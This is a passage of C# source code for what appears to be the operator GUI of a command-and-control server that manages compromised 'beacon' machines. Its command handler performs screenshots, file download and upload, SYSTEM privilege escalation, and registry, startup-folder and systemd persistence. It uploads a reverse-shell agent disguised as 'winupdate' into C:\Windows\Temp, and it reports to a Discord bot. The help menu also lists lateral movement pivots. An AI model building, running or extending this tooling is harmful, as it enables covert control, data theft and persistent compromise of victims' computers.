                var clients = new List<ClientInfo>();

                if (_isOperatorConnected)
                {
                    // For operator mode, convert ListView items to ClientInfo
                    foreach (ListViewItem item in lvClients.Items)
                    {
                        if (item.Tag == null) continue;

                        var clientInfo = new ClientInfo
                        {
                            ClientId = item.Tag.ToString(),
                            ClientInfo_ = item.SubItems[1].Text,
                            UserName = ExtractUsernameFromDisplay(item.SubItems[3].Text),
                            ComputerName = item.SubItems[4].Text,
                            IsAdmin = item.SubItems[5].Text == "Yes",
                            IsConnected = item.SubItems[2].Text == "Active",
                            IsEncrypted = item.SubItems[6].Text.Contains("🔒"),
                            OSVersion = item.SubItems[7].Text,
                            IsDomainJoined = item.SubItems[3].Text.Contains("(Domain User)"),
                            LastSeen = DateTime.Now
                        };

                        clients.Add(clientInfo);
                    }
                }
                else if (_server != null)
                {
                    // For local server mode, get clients from server
                    clients = _server.GetClients().Select(c => new ClientInfo
                    {
                        ClientId = c.ClientId,
                        ClientInfo_ = c.ClientInfo,
                        UserName = c.UserName,
                        ComputerName = c.ComputerName,
                        IsAdmin = c.IsAdmin,
                        IsConnected = c.IsConnected,
                        IsEncrypted = c.IsEncrypted,
                        OSVersion = c.OSVersion,
                        IsDomainJoined = c.IsDomainJoined,
                        IsLinux = c.IsLinux,
                        LastSeen = c.LastSeen
                    }).ToList();
                }

                // Update topology with clients
                _topologyViewer.UpdateBeacons(clients);

                // Highlight active beacon
                string activeBeaconId = _isOperatorConnected ? _operatorActiveClientId : _server?.ActiveClientId;
                if (!string.IsNullOrEmpty(activeBeaconId))
                {
                    _topologyViewer.SetActiveBeacon(activeBeaconId);
                }

            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error updating topology view: {ex.Message}", Color.Red);
            }
        }

        private string ExtractUsernameFromDisplay(string displayText)
        {
            if (string.IsNullOrEmpty(displayText)) return "Unknown";

            // Remove privilege indicators
            var cleanText = displayText
                .Replace(" (Administrator)", "")
                .Replace(" (Domain User)", "")
                .Replace(" (Local User)", "")
                .Trim();

            return cleanText;
        }
        private void UpdateStatusBar(string message = null)
        {
            if (_isOperatorConnected && _operatorConnection?.Connected == true)
            {
                string operatorStatusstatus = $"Operator Mode: Connected as {_operatorUsername} | Server: {_operatorConnection.Client.RemoteEndPoint}";

                string selectedClientId = GetSelectedClientId();
                if (!string.IsNullOrEmpty(selectedClientId))
                {
                    operatorStatusstatus += $" | Selected: {selectedClientId}";
                }

                statusStripLabel.Text = message ?? operatorStatusstatus;
                statusStripLabel.ForeColor = Color.FromArgb(0, 120, 215); // Blue for operator mode
                return;
            }

            // Original local server status logic
            if (_server == null)
            {
                statusStripLabel.Text = message ?? "Server not started";
                return;
            }

            int activeClients = _server.ClientCount;
            TimeSpan uptime = _server.Uptime;
            string activeClientId = _server.ActiveClientId;

            string activeClientInfo = _server.GetActiveClientInfo();
            string activeClientUserName = string.Empty;
            bool isActiveClientAdmin = false;
            bool isActiveClientDomain = false;

            if (!string.IsNullOrEmpty(activeClientId))
            {
                var activeClient = _server.GetClients().FirstOrDefault(c => c.ClientId == activeClientId);
                if (activeClient != null)
                {
                    isActiveClientAdmin = activeClient.IsAdmin;
                    activeClientUserName = activeClient.UserName;
                    isActiveClientDomain = activeClientUserName.Contains("\\") &&
                                        !activeClientUserName.Contains("NT AUTHORITY");
                }
            }

            // Count secure vs insecure connections
            int secureConnections = 0;
            int insecureConnections = 0;

            foreach (var client in _server.GetClients())
            {
                if (client.IsConnected)
                {
                    if (client.IsEncrypted)
                        secureConnections++;
                    else
                        insecureConnections++;
                }
            }

            string securityStatus = secureConnections > 0 ? $" | Secure: {secureConnections}" : "";
            if (insecureConnections > 0)
            {
                securityStatus += $" | Insecure: {insecureConnections}";
            }

            string ipAddress;
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    ipAddress = endPoint.Address.ToString();
                }
            }
            catch
            {
                ipAddress = "127.0.0.1"; // Fallback
            }
            txtIPAddress.Text = ipAddress;
            string _ipAddress = ipAddress;

            string status = $"Active Beacons: {activeClients} | Uptime: {uptime.Days}d {uptime.Hours}h {uptime.Minutes}m | Listening: {_ipAddress}:{_port}{securityStatus}";

            if (!string.IsNullOrEmpty(activeClientId))
            {
                status += $" | Connected to: {activeClientId} ({activeClientInfo})";

                List<string> indicators = new List<string>();

                if (activeClientUserName.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase) ||
                    activeClientUserName.Contains("SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    indicators.Add("SYSTEM");
                }
                else if (isActiveClientAdmin)
                {
                    indicators.Add("ADMIN");
                }

                if (isActiveClientDomain)
                {
                    indicators.Add("DOMAIN");
                }
                else if (!activeClientUserName.Contains("SYSTEM"))
                {
                    indicators.Add("LOCAL");
                }

                if (indicators.Count > 0)
                {
                    status += $" [{string.Join("|", indicators)}]";
                }
            }

            statusStripLabel.Text = message ?? status;

            if (!string.IsNullOrEmpty(activeClientId))
            {
                if (activeClientUserName.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase) ||
                    activeClientUserName.Contains("SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    statusStripLabel.ForeColor = Color.Red;
                }
                else if (isActiveClientAdmin)
                {
                    statusStripLabel.ForeColor = Color.FromArgb(220, 0, 0);
                }
                else if (isActiveClientDomain)
                {
                    statusStripLabel.ForeColor = Color.FromArgb(0, 120, 215);
                }
                else
                {
                    statusStripLabel.ForeColor = Color.FromArgb(220, 220, 220);
                }
            }
            else
            {
                statusStripLabel.ForeColor = Color.FromArgb(220, 220, 220);
            }
        }
        private void btnSendCommand_Click(object sender, EventArgs e)
        {
            string command = txtCommand.Text.Trim();
            if (string.IsNullOrEmpty(command)) return;

            _commandHistory.Add(command);
            _commandHistoryIndex = _commandHistory.Count;

            ProcessCommand(command);
            txtCommand.Clear();
            txtCommand.Focus();
        }
        private void txtCommand_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {
                e.Handled = true;
                btnSendCommand.PerformClick();
            }
        }
        private void SetupActivityMonitor()
        {
            // Create activity panel
            activityPanel = new FlowLayoutPanel();
            activityPanel.Dock = DockStyle.Right;
            activityPanel.Width = 300;
            activityPanel.BackColor = Color.FromArgb(35, 35, 35);
            activityPanel.FlowDirection = FlowDirection.TopDown;
            activityPanel.WrapContents = false;
            activityPanel.AutoScroll = true;

            // Add it to the form
            this.Controls.Add(activityPanel);

            // Resize other controls
            splitContainer1.Width -= activityPanel.Width;

            // Setup timer to clean old activity
            activityCleanupTimer = new System.Windows.Forms.Timer();
            activityCleanupTimer.Interval = 30000; // 30 seconds
            activityCleanupTimer.Tick += (sender, e) =>
            {
                CleanupOldActivity();
            };
            activityCleanupTimer.Start();
        }

        private void AddActivityItem(string message, Color color)
        {
            // Create panel for activity item
            Panel item = new Panel();
            item.Width = activityPanel.Width - 25; // Account for scrollbar
            item.Height = 40;
            item.BackColor = Color.FromArgb(45, 45, 48);
            item.Tag = DateTime.Now; // Store time for cleanup

            // Add timestamp
            Label timestamp = new Label();
            timestamp.Text = DateTime.Now.ToString("HH:mm:ss");
            timestamp.ForeColor = Color.Gray;
            timestamp.AutoSize = true;
            timestamp.Location = new Point(5, 3);

            // Add message
            Label messageLabel = new Label();
            messageLabel.Text = message.Length > 30 ? message.Substring(0, 27) + "..." : message;
            messageLabel.ForeColor = color;
            messageLabel.AutoSize = true;
            messageLabel.Location = new Point(5, 20);

            // Add to panel
            item.Controls.Add(timestamp);
            item.Controls.Add(messageLabel);

            // Add to activity monitor
            activityPanel.Controls.Add(item);
            activityPanel.ScrollControlIntoView(item);
        }

        private void CleanupOldActivity()
        {
            List<Control> toRemove = new List<Control>();

            foreach (Control control in activityPanel.Controls)
            {
                if (control.Tag is DateTime time)
                {
                    // Remove items older than 5 minutes
                    if (DateTime.Now - time > TimeSpan.FromMinutes(5))
                    {
                        toRemove.Add(control);
                    }
                }
            }

            foreach (Control control in toRemove)
            {
                activityPanel.Controls.Remove(control);
                control.Dispose();
            }
        }
        private void ProcessCommand(string command)
        {
            if (_isOperatorConnected && _operatorConnection?.Connected == true)
            {
                // For operators, send most commands to the server
                string[] serverCommands = { "connect", "disconnect", "kill", "list", "beacons", "sessions" };
                string[] clientCommands = { "whoami", "hostname", "pwd", "cd", "dir", "ls", "systeminfo", "ipconfig", "ps", "screenshot", "download", "upload", "getsystem", "persist" };

                string cmdWord = command.Split(' ')[0].ToLower();

                if (serverCommands.Contains(cmdWord) || clientCommands.Contains(cmdWord))
                {
                    Task.Run(() => SendOperatorCommand(command));
                    return;
                }

                // For local commands like help, clear, still process locally
                if (cmdWord == "help")
                {
                    ShowHelpDialog();
                    return;
                }
                else if (cmdWord == "clear" || cmdWord == "cls")
                {
                    txtOutput.Clear();
                    DisplayBanner();
                    return;
                }

                // For any other command, send to server
                Task.Run(() => SendOperatorCommand(command));
                return;
            }

            // Original local server logic - FIXED: Don't log command here, let SendCommand handle it
            if (_server == null) return;

            // Handle local server commands...
            string[] parts = command.Split(new char[] { ' ' }, 3);
            string cmd = parts[0].ToLower();
            string arguments = parts.Length > 1 ? parts[1] : string.Empty;
            string additionalArgs = parts.Length > 2 ? parts[2] : string.Empty;

            switch (cmd)
            {
                case "help":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    ShowHelpDialog();
                    break;



                case "list":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    RefreshClientList();
                    LogMessage("Client list refreshed", Color.Gray);
                    break;

                case "beacons":
                case "sessions":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    _server.ShowBeacons();
                    break;

                case "connect":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    _server.ConnectToClient(arguments);
                    RefreshClientList();
                    break;

                case "disconnect":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    _server.DisconnectClient();
                    RefreshClientList();
                    LogMessage("[*] Disconnected from session (session still active)", Color.Yellow);
                    break;

                case "kill":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    _server.KillClient(arguments);
                    RefreshClientList();
                    break;

                case "clear":
                case "cls":
                    txtOutput.Clear();
                    DisplayBanner();
                    break;

                case "screenshot":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    if (_server != null && _server.IsMultiplayerEnabled())
                    {
                        _server.BroadcastServerCommand(command, _server.ActiveClientId ?? "None");
                    }
                    _server.CaptureScreenshot(_downloadPath);
                    break;

                case "persist":
                    if (_server.GetActiveClient() == null)
                    {
                        LogMessage("[!] No active client connection. Use 'connect <id>' command first", Color.Red);
                        return;
                    }

                    if (string.IsNullOrEmpty(arguments))
                    {
                        // Show persistence menu if no arguments provided
                        LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                        if (_server.GetActiveClient()?.IsLinux == true)
                        {
                            Task.Run(async () => await _server.ShowLinuxPersistenceMenuWithTime());
                        }
                        else
                        {
                            Task.Run(async () => await _server.ShowPersistenceMenu());
                        }
                        return;
                    }

                    var persistClient = _server.GetActiveClient();

                    if (persistClient.IsLinux)
                    {
                        // Handle Linux persistence
                        if (arguments == "-t" && !string.IsNullOrEmpty(additionalArgs))
                        {
                            LogMessage($"[*] Installing Linux persistence with time parameter: {arguments} {additionalArgs}", Color.Yellow);

                            if (int.TryParse(additionalArgs, out int timeSeconds))
                            {
                                if (timeSeconds < 10)
                                {
                                    LogMessage("[!] Minimum restart interval is 10 seconds", Color.Red);
                                    return;
                                }

                                // Create PersistenceManager instance directly
                                Task.Run(async () =>
                                {
                                    try
                                    {
                                        var persistenceManager = new PersistenceManager(_server);
                                        persistenceManager.OutputMessage += (sender, e) =>
                                        {
                                            this.Invoke(new Action(() => LogMessage(e.Message, e.Color)));
                                        };

                                        persistenceManager.SetActiveClient(persistClient);
                                        await persistenceManager.InstallLinuxPersistenceWithTime(timeSeconds);
                                    }
                                    catch (Exception ex)
                                    {
                                        this.Invoke(new Action(() =>
                                        {
                                            LogMessage($"[!] Linux persistence installation failed: {ex.Message}", Color.Red);
                                        }));
                                    }
                                });
                            }
                            else
                            {
                                LogMessage("[!] Invalid time format. Use: persist -t <seconds>", Color.Red);
                            }
                        }
                        else if (arguments == "-t")
                        {
                            LogMessage("[!] Linux persistence requires time parameter", Color.Red);
                            LogMessage("[*] Usage: persist -t <seconds>", Color.Yellow);
                            LogMessage("[*] Example: persist -t 300", Color.Yellow);
                        }
                        else
                        {
                            LogMessage("[!] Linux persistence requires time parameter", Color.Red);
                            LogMessage("[*] Usage: persist -t <seconds>", Color.Yellow);
                            LogMessage("[*] Example: persist -t 300", Color.Yellow);
                        }
                    }
                    else
                    {
                        // Handle Windows persistence (existing code remains the same)
                        if (int.TryParse(arguments, out int method) && method >= 1 && method <= 3)
                        {
                            LogMessage($"[*] Installing Windows persistence method {method}...", Color.Yellow);

                            FindAgentAndExecute(async (agentPath) =>
                            {
                                try
                                {
                                    LogMessage($"[*] Using agent: {Path.GetFileName(agentPath)}", Color.Cyan);

                                    string clientId = _server.GetActiveClient()?.ClientId;
                                    if (!string.IsNullOrEmpty(clientId))
                                    {
                                        string uploadedAgentPath = await UploadAgentToTarget(agentPath);
                                        if (!string.IsNullOrEmpty(uploadedAgentPath))
                                        {
                                            _uploadedAgents[clientId] = uploadedAgentPath;
                                            await _server.InstallWindowsPersistence(method, uploadedAgentPath);

                                            this.Invoke(new Action(() =>
                                            {
                                                string methodName = method switch
                                                {
                                                    1 => "Registry Autorun (HKCU)",
                                                    2 => "Registry Autorun (HKLM)",
                                                    3 => "Startup Folder",
                                                    _ => "Unknown"
                                                };
                                                LogMessage($"[+] Persistence method '{methodName}' installed successfully", Color.Green);
                                            }));
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    this.Invoke(new Action(() =>
                                    {
                                        LogMessage($"[!] Persistence installation failed: {ex.Message}", Color.Red);
                                    }));
                                }
                            }, "persistence installation");
                        }
                        else
                        {
                            LogMessage("[!] Invalid persistence method", Color.Red);
                            LogMessage("[*] Usage: persist <1|2|3>", Color.Yellow);
                            LogMessage("[*] 1 = Registry Autorun (HKCU)", Color.Yellow);
                            LogMessage("[*] 2 = Registry Autorun (HKLM)", Color.Yellow);
                            LogMessage("[*] 3 = Startup Folder", Color.Yellow);
                        }
                    }
                    break;
                case "cleanup_persist":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    if (_server.GetActiveClient() == null)
                    {
                        LogMessage("[!] No active client connection. Use 'connect <id>' command first", Color.Red);
                        return;
                    }

                    var cleanupClient = _server.GetActiveClient();
                    if (cleanupClient.IsLinux)
                    {
                        LogMessage("[*] Starting Linux persistence cleanup...", Color.Yellow);
                        Task.Run(async () => await _server.CleanupLinuxPersistence());
                    }
                    else
                    {
                        LogMessage("[*] Starting Windows persistence cleanup...", Color.Yellow);
                        Task.Run(async () => await _server.CleanupWindowsPersistence());
                    }
                    break;

                case "download":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    if (_server != null && _server.IsMultiplayerEnabled())
                    {
                        _server.BroadcastServerCommand(command, _server.ActiveClientId ?? "None");
                    }

                    if (string.IsNullOrEmpty(arguments))
                    {
                        LogMessage("[!] Please specify a file path to download", Color.Red);
                    }
                    else
                    {
                        _server.DownloadFile(arguments, _downloadPath);
                    }
                    if (_server?.ActiveClientId != null)
                    {
                        Task.Run(async () => await discordManager.NotifyFileOperation("Download", arguments, _server.ActiveClientId, true));
                    }

                    break;

                case "getsystem":
                    if (_server.GetActiveClient() == null)
                    {
                        LogMessage("[!] No active client connection. Use 'connect <id>' command first", Color.Red);
                        return;
                    }

                    var activeClient = _server.GetActiveClient();
                    if (activeClient?.IsLinux == true)
                    {
                        LogMessage("[!] GetSystem not supported on Linux targets", Color.Red);
                        LogMessage("[*] Try using 'sudo -i' or other Linux privilege escalation techniques", Color.Yellow);
                        return;
                    }

                    LogMessage("[*] Initiating SYSTEM privilege escalation...", Color.Yellow);

                    FindAgentAndExecute(async (agentPath) =>
                    {
                        try
                        {
                            LogMessage($"[*] Using agent: {Path.GetFileName(agentPath)}", Color.Cyan);
                            await _server.ElevateToSystemWithUpload(agentPath);
                        }
                        catch (Exception ex)
                        {
                            this.Invoke(new Action(() =>
                            {
                                LogMessage($"[!] GetSystem failed: {ex.Message}", Color.Red);
                            }));
                        }
                    }, "SYSTEM privilege escalation");
                    break;
                case "discord_config":
                    if (parts.Length >= 3)
                    {
                        string token = parts[1];
                        string channelId = parts[2];
                        string guildId = parts.Length > 3 ? parts[3] : "";
                        discordManager.ConfigureDiscordBot(token, channelId, guildId);
                    }
                    else
                    {
                        LogMessage("[!] Usage: discord_config <token> <channel_id> [guild_id]", Color.Red);
                        LogMessage("[*] Get token from Discord Developer Portal", Color.Yellow);
                        LogMessage("[*] Get channel ID by right-clicking channel > Copy ID", Color.Yellow);
                        LogMessage("[*] Guild ID is optional but required for slash commands", Color.Yellow);
                    }
                    break;

                case "discord_on":
                    discordManager.ToggleDiscordNotifications(true);
                    break;

                case "discord_off":
                    discordManager.ToggleDiscordNotifications(false);
                    break;

                case "discord_test":
                    _ = Task.Run(async () => await discordManager.TestDiscordNotification());
                    break;

                case "discord_status":
                    discordManager.ShowDiscordStatus();
                    break;


                case "discord_help":
                    discordManager.ShowDiscordStatus();
                    LogMessage("\n=== Discord Command Integration ===", Color.Cyan);
                    LogMessage("Available Discord-specific commands:", Color.White);
                    LogMessage("  discord_stats      - Send server statistics to Discord", Color.Cyan);
                    LogMessage("  discord_beacon_info - Send current beacon info to Discord", Color.Cyan);
                    LogMessage("  discord_test       - Test Discord notifications", Color.Cyan);
                    LogMessage("\nAll standard C2 commands are available through Discord:", Color.Yellow);
                    LogMessage("Use !help in Discord channel to see full command list", Color.Yellow);
                    break;
                case "upload":
                    LogMessage($"[{DateTime.Now:HH:mm:ss}][Server] > {command}", Color.Blue);
                    if (_server != null && _server.IsMultiplayerEnabled())
                    {
                        _server.BroadcastServerCommand(command, _server.ActiveClientId ?? "None");
                    }

                    lock (_uploadLock)
                    {
                        if (_currentUploadTask != null && _currentUploadTask.IsCompleted)
                        {
                            _currentUploadTask = null;
                        }

                        if (_currentUploadTask != null && !_currentUploadTask.IsCompleted)
                        {
                            LogMessage("[!] An upload is already in progress. Please wait for it to complete.", Color.Red);
                            break;
                        }

                        if (string.IsNullOrEmpty(arguments))
                        {
                            LogMessage("[!] Usage: upload <local_path> [remote_path]", Color.Red);
                            break;
                        }

                        string[] argParts = arguments.Split(new[] { ' ' }, 2);
                        string localPath = argParts[0].Trim();
                        string remotePath = argParts.Length > 1 ? argParts[1].Trim() : string.Empty;

                        if (!File.Exists(localPath))
                        {
                            LogMessage($"[!] Local file not found: {localPath}", Color.Red);
                            break;
                        }

                        _currentUploadTask = Task.Run(async () =>
                        {
                            try
                            {
                                this.Invoke(new Action(() =>
                                {
                                    uploadProgressBar.Value = 0;
                                    uploadProgressBar.Visible = true;
                                }));

                                _server.SendCommand("cd");

                                await _server.UploadFileWithProgress(localPath, remotePath,
                                    progress =>
                                    {
                                        this.Invoke(new Action(() =>
                                        {
                                            uploadProgressBar.Value = progress;
                                        }));
                                    });

                                this.Invoke(new Action(() =>
                                {
                                    uploadProgressBar.Visible = false;
                                }));
                            }
                            catch (Exception ex)
                            {
                                this.Invoke(new Action(() =>
                                {
                                    LogMessage($"[!] Upload error: {ex.Message}", Color.Red);
                                    uploadProgressBar.Visible = false;
                                }));
                            }
                        });

                        break;
                    }

                default:
                    _server.SendCommand(command);
                    break;
            }
        }
        private async Task<string> UploadAgentToTarget(string localAgentPath)
        {
            try
            {
                LogMessage($"[*] Uploading agent: {Path.GetFileName(localAgentPath)}", Color.Yellow);

                // Generate a random remote path
                string fileName = $"winupdate-{DateTime.Now:HHmmss}.exe";
                string remotePath = $@"C:\Windows\Temp\{fileName}";

                // Upload with progress
                await Task.Run(async () =>
                {
                    this.Invoke(new Action(() =>
                    {
                        uploadProgressBar.Value = 0;
                        uploadProgressBar.Visible = true;
                    }));

                    try
                    {
                        await _server.UploadFileWithProgress(localAgentPath, remotePath, progress =>
                        {
                            this.Invoke(new Action(() =>
                            {
                                uploadProgressBar.Value = progress;
                            }));
                        });

                        this.Invoke(new Action(() =>
                        {
                            uploadProgressBar.Visible = false;
                        }));
                    }
                    catch (Exception ex)
                    {
                        this.Invoke(new Action(() =>
                        {
                            LogMessage($"[!] Upload failed: {ex.Message}", Color.Red);
                            uploadProgressBar.Visible = false;
                        }));
                        throw;
                    }
                });

                LogMessage($"[+] Agent uploaded successfully: {remotePath}", Color.Green);
                return remotePath;
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Failed to upload agent: {ex.Message}", Color.Red);
                return null;
            }
        }
        private async Task InstallWindowsPersistenceWithUpload(int method)
        {
            try
            {
                string clientId = _server.GetActiveClient()?.ClientId;
                if (string.IsNullOrEmpty(clientId))
                {
                    LogMessage("[!] No active client", Color.Red);
                    return;
                }

                string agentPath = null;

                // Check if we already have an uploaded agent for this client
                if (_uploadedAgents.ContainsKey(clientId))
                {
                    agentPath = _uploadedAgents[clientId];
                    LogMessage($"[*] Reusing previously uploaded agent: {Path.GetFileName(agentPath)}", Color.Green);
                }
                else
                {
                    // Need to upload a new agent
                    agentPath = await PromptForAgentUpload();

                    if (string.IsNullOrEmpty(agentPath))
                    {
                        LogMessage("[!] Persistence cancelled - no agent provided", Color.Red);
                        return;
                    }

                    // Store the uploaded agent path for reuse
                    _uploadedAgents[clientId] = agentPath;
                }

                // Install persistence with the agent path
                await _server.InstallWindowsPersistence(method, agentPath);
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error in persistence installation: {ex.Message}", Color.Red);
            }
        }

        private async Task<string> PromptForAgentUpload()
        {
            string agentPath = null;
            string remotePath = null;

            // If we have a previously selected agent, offer to reuse it
            if (!string.IsNullOrEmpty(_lastSelectedAgentPath) && File.Exists(_lastSelectedAgentPath))
            {
                DialogResult reuseResult = MessageBox.Show(
                    $"Reuse previously selected agent?\n\n{Path.GetFileName(_lastSelectedAgentPath)}",
                    "Agent Selection",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question);

                if (reuseResult == DialogResult.Yes)
                {
                    agentPath = _lastSelectedAgentPath;
                }
            }

            // If no reuse or user said no, prompt for new agent
            if (string.IsNullOrEmpty(agentPath))
            {
                this.Invoke(new Action(() =>
                {
                    using (OpenFileDialog openFileDialog = new OpenFileDialog())
                    {
                        openFileDialog.Title = "Select Windows Agent for Persistence";
                        openFileDialog.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                        openFileDialog.InitialDirectory = Application.StartupPath;

                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            agentPath = openFileDialog.FileName;
                            _lastSelectedAgentPath = agentPath; // Remember for next time
                        }
                    }
                }));
            }

            if (string.IsNullOrEmpty(agentPath))
            {
                return null;
            }

            // Upload the agent to the target
            try
            {
                LogMessage($"[*] Uploading agent for persistence: {Path.GetFileName(agentPath)}", Color.Yellow);

                // Generate a random remote path
                string fileName = $"winupdate-{DateTime.Now:HHmmss}.exe";
                remotePath = $@"C:\Windows\Temp\{fileName}";

                // Upload with progress
                await Task.Run(async () =>
                {
                    this.Invoke(new Action(() =>
                    {
                        uploadProgressBar.Value = 0;
                        uploadProgressBar.Visible = true;
                    }));

                    try
                    {
                        await _server.UploadFileWithProgress(agentPath, remotePath, progress =>
                        {
                            this.Invoke(new Action(() =>
                            {
                                uploadProgressBar.Value = progress;
                            }));
                        });

                        this.Invoke(new Action(() =>
                        {
                            uploadProgressBar.Visible = false;
                        }));
                    }
                    catch (Exception ex)
                    {
                        this.Invoke(new Action(() =>
                        {
                            LogMessage($"[!] Upload failed: {ex.Message}", Color.Red);
                            uploadProgressBar.Visible = false;
                        }));
                        throw;
                    }
                });

                LogMessage($"[+] Agent uploaded successfully: {remotePath}", Color.Green);
                return remotePath;
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Failed to upload agent: {ex.Message}", Color.Red);
                return null;
            }
        }




        private void FindAgentAndExecute(Func<string, Task> action, string operationName)
        {
            string foundAgent = FindClientExecutableInDirectory();

            if (!string.IsNullOrEmpty(foundAgent))
            {
                LogMessage($"[*] Found agent: {Path.GetFileName(foundAgent)}", Color.Yellow);
                Task.Run(async () => await action(foundAgent));
                return;
            }

            // If we can't find it automatically, ask the user
            PromptForAgentSelection(action, operationName);
        }
        private void PromptForAgentSelection(Func<string, Task> action, string operationName)
        {
            this.Invoke(new Action(() =>
            {
                using (OpenFileDialog openFileDialog = new OpenFileDialog())
                {
                    openFileDialog.Title = $"Select agent executable for {operationName}";
                    openFileDialog.Filter = "Executable files (*.exe)|*.exe|All files (*.*)|*.*";
                    openFileDialog.InitialDirectory = Application.StartupPath;

                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        string agentPath = openFileDialog.FileName;
                        LogMessage($"[*] Using selected agent: {Path.GetFileName(agentPath)}", Color.Yellow);
                        Task.Run(async () => await action(agentPath));
                    }
                    else
                    {
                        LogMessage($"[!] {operationName} cancelled - no agent selected", Color.Red);
                    }
                }
            }));
        }
        private string FindClientExecutableInDirectory()
        {
            try
            {
                string appDirectory = Application.StartupPath;

                // Priority 1: Standard agent location
                string standardAgentPath = Path.Combine(appDirectory, "ReverseShellClient.exe");
                if (File.Exists(standardAgentPath))
                {
                    return standardAgentPath;
                }

                // Priority 2: Look for timestamped client files (like "client_192_168_159_130_443_20250725_154840.exe")
                string[] timestampedClients = Directory.GetFiles(appDirectory, "client_*.exe", SearchOption.TopDirectoryOnly);
                if (timestampedClients.Length > 0)
                {
                    // Sort by creation time to get the most recent
                    var sortedClients = timestampedClients
                        .Select(f => new FileInfo(f))
                        .OrderByDescending(fi => fi.CreationTime)
                        .Select(fi => fi.FullName)
                        .ToArray();

                    return sortedClients[0];
                }

                // Priority 3: Look for any .exe with "client" in the name
                string[] possibleAgents = Directory.GetFiles(appDirectory, "*client*.exe", SearchOption.TopDirectoryOnly);
                if (possibleAgents.Length > 0)
                {
                    // Sort by creation time to get the most recent
                    var sortedAgents = possibleAgents
                        .Select(f => new FileInfo(f))
                        .OrderByDescending(fi => fi.CreationTime)
                        .Select(fi => fi.FullName)
                        .ToArray();

                    return sortedAgents[0];
                }

                // Priority 4: Look for any .exe with common agent names
                string[] commonAgentPatterns = { "*agent*.exe", "*shell*.exe", "*payload*.exe", "*beacon*.exe" };

                foreach (string pattern in commonAgentPatterns)
                {
                    string[] matches = Directory.GetFiles(appDirectory, pattern, SearchOption.TopDirectoryOnly);
                    if (matches.Length > 0)
                    {
                        var sortedMatches = matches
                            .Select(f => new FileInfo(f))
                            .OrderByDescending(fi => fi.CreationTime)
                            .Select(fi => fi.FullName)
                            .ToArray();

                        return sortedMatches[0];
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error searching for client executable: {ex.Message}", Color.Yellow);
            }

            return null;
        }




        private void ShowHelpDialog()
        {
            // Header
            LogMessage("", Color.White);
            LogMessage("┌─── Available Server Commands ───────────────────────────────────────────────┐", Color.Cyan);
            LogMessage("│                                                                             │", Color.Cyan);
            LogMessage("│  help                - Show this help menu                                  │", Color.White);
            LogMessage("│  beacons/sessions    - Show detailed view of all active sessions            │", Color.White);
            LogMessage("│  list                - List all connected clients                           │", Color.White);
            LogMessage("│  connect <id>        - Connect to a specific client session                 │", Color.White);
            LogMessage("│  disconnect          - Disconnect from current session (keeps alive)        │", Color.White);
            LogMessage("│  kill <id>           - Terminate a client connection                        │", Color.White);
            LogMessage("│  screenshot          - Capture desktop screenshot (Windows only)            │", Color.White);
            LogMessage("│  download <path>     - Download a file from the client                      │", Color.White);
            LogMessage("│  upload <local> <rem>- Upload a file to the client                          │", Color.White);
            LogMessage("│  clear/cls           - Clear the console screen                             │", Color.White);
            LogMessage("│  exit/quit           - Exit the C2 server                                   │", Color.White);
            LogMessage("│                                                                             │", Color.Cyan);
            LogMessage("└─────────────────────────────────────────────────────────────────────────────┘", Color.Cyan);
            LogMessage("", Color.White);

            // C2 Framework Commands
            LogMessage("┌─── C2 Framework Commands ────────────────────────────────────────────────── ─┐", Color.Yellow);
            LogMessage("│                                                                              │", Color.Yellow);
            LogMessage("│  pivot <method>      - Lateral movement and pivoting                         │", Color.White);
            LogMessage("│  pivot scshell       - SCShell service modification pivot                    │", Color.White);
            LogMessage("│  pivot help          - Show pivot command help                               │", Color.White);
            LogMessage("│                                                                              │", Color.Yellow);
            LogMessage("└───────────────────────────────────────────────────────────────────────────── ┘", Color.Yellow);
            LogMessage("", Color.White);

            // Privilege Escalation
            LogMessage("┌─── Privilege Escalation and Persistence───────────────────────────────────────┐", Color.Red);
            LogMessage("│                                                                               │", Color.Red);
            LogMessage("│  getsystem           - Elevate to SYSTEM privileges                           │", Color.White);
            LogMessage("│  persist 1           - Registry autorun (HKCU)                                │", Color.White);
            LogMessage("│  persist 2           - Registry autorun (HKLM, admin required)                │", Color.White);
            LogMessage("│  persist 3           - Startup folder                                         │", Color.White);
            LogMessage("│  persist -t 5        - Linux: Systemd service, restart every 5 minutes        │", Color.White);
            LogMessage("│  cleanup_persist     - Clean up Linux persistence mechanisms                  │", Color.White);
            LogMessage("│                                                                               │", Color.Red);
            LogMessage("└──────────────────────────────────────────────────────────────────────────── ──┘", Color.Red);
